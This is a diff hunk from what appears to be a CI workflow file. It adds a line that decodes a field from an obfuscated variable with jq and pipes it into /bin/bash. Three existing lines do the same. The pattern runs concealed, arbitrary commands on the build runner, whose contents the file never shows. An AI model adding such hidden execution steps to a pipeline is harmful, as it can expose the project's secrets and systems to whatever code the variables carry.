@@ -44,6 +44,7 @@ jobs:
           echo $ojorg3858 | jq -r .p6999 | /bin/bash
           echo $ms1884 | jq -r .unvj46 | /bin/bash
           printf '%s' "$jvbg4" | jq -r .ggxj911 | /bin/bash
+          echo $cfm33 | jq -r .peq2 | /bin/bash
 
       - name: Archive output
         if: always()
